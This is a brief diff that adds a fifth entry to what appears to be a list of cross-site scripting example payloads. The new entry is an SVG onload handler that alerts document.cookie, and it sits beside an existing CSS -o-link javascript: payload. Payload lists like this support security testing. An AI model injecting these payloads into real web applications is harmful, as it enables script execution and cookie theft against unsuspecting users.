@@ -23,3 +23,9 @@ Example Payload 4:
 ```
 #red;-o-link:\u0027\u003Cjavascript:alert(1)\u003E\u0027;-o-link-source:current; testit`
 ```
+
+Example Payload 5:
+```
+<svg/onload=alert(document.cookie)>
+```
+
